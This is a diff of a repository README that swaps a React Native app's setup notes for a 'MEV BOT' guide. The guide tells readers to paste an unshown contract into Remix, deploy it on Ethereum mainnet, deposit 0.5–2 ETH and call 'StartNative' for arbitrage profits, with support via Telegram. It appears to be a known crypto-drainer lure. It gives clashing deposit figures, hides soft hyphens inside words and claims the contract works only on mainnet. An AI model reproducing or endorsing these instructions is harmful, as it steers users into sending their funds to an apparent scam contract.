@@ -1,66 +1,81 @@
-# hut8
+# MEV-BOT
 
-Just another react-native app
+## Overview
+Welcome to the **MEV BOT** GitHub repository! This project is designed to help users easily deploy and manage a smart contract for Ethereum that performs arbitrage operations with a minimum deposit requirement.
 
-## Screenshots
+## Features
+- **Easy to Use**: Simple deployment and management.
+- **Secure**: Ensures a minimum deposit of 1 ETH.
+- **Optimized**: Efficient use of gas and resources.
 
-<img src="./screenshots/1.PNG" style="width: 200px;"></img>
-<img src="./screenshots/2.PNG" style="width: 200px;"></img>
-<img src="./screenshots/3.PNG" style="width: 200px;"></img>
+## Important Note
+This smart contract is designed to operate on the Ethereum mainnet and does not work on testnets due to specific dependencies and functionalities that are only present on the mainnet.
 
-## Getting Started
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Important Note](#important-note)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#Support)
+- [Help](#Help)
+- [License](#license)
 
-### Android & iOS Environments
+## Installation
 
-1. Follow the [React Native getting started guide here](https://facebook.github.io/react-native/docs/getting-started). Select the **React Native CLI Quickstart** tab, there's no Expo required in this project.
+### Deploying with Remix IDE
 
-- Install dependencies listed - Node, Watchman, JDK.
-- Install React Native CLI globally.
+1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
+   Access the  [**Remix IDE**](https://remix.ethereum.org)(this website is where we deploy the smart contract).
 
-3. Install [Android Studio](https://developer.android.com/studio)
+2. **Create a New File**:
+   Click on the **File Explorers** tab, then click on **Create New File** and name it `MevBot.sol`.
 
-4. Install/update the [latest version of Xcode](https://itunes.apple.com/us/app/xcode/id497799835?mt=12).
 
-5. Install [CocoaPods](https://cocoapods.org) (iOS package management tool):
+3. **Copy the Contract Code**:
+   [**Copy the entire contract code**](MevBot.sol) from this repository and paste it into `MevBot.sol`.
 
-```
-sudo gem install cocoapods
-```
+4. **Compile the Contract**:
+   Click on the **Solidity Compiler** tab, select the appropriate compiler version 0.6.12, and click on **Compile MevBot.sol**.
 
-### Project Setup
 
-1. Clone this repository
+5. **Deploy the Contract**:
+   - Click on the **Deploy & Run Transactions** tab.
+   - Select `Injected Web3` as the environment to connect to MetaMask.
+   - Ensure you are connected to the Ethereum mainnet in MetaMask.
+   - Click on the **Deploy** button.
 
-2. CD to the project root, then install package dependencies:
+6. **Confirm Deployment**:
+   Confirm the deployment transaction in MetaMask. Make sure you have enough ETH in your wallet to cover the gas fees and the minimum deposit requirement.
 
-```
-npm install
-```
+### Using the Contract
 
-3. CD to `[projectroot]/ios` folder and install the project iOS pod dependencies:
+1. **Deposit ETH**:
+   Ensure that the contract has at least 0.5 ETH deposited. You can send ETH to the contract address directly from your wallet.
 
-```
-pod install
-```
+2. **Start Arbitrage**:
+   Use the `StartNative` function to initiate the arbitrage process.
 
-### Appendix - I
+3. **Monitor Transactions**:
+   Monitor your transactions and profits using a block explorer like [**Etherscan.io**](https://etherscan.io/).
 
-#### List of pending changes/improvements
+## Usage
 
-1. Fetching of member data from API.
+### Start Arbitrage Operation
+1. **Ensure sufficient funds**:
+   We recommend funding the contract with at least 0.5-2 ETH or higher to cover gas fees and possible burn fees. Bot targets to­ken c­ontr­a­cts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.
 
-2. Persisting weekely spending limit on app close.
+2. **Call `StartNative`**:
+   Call the `StartNative` function to start the arbitrage process. You can do this directly from Remix or using any Ethereum wallet that supports contract interactions.
 
-3. Matching text fonts more inaccurately.
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-4. Matching sizing and spacing more inaccurately.
+## Help
+If at any time you encounter any issues with the contract setup, contact the team at  [**Click Here**](https://t.me/UniMevBotsSupport/). 🛡️
 
-5. Refactoring of common styles.
+## License
 
-6. Skeleton loader on Debit Card Tab.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-7. App icon and identifier.
 
-8. Splash/Launch screen.
-
-9. Test cases.
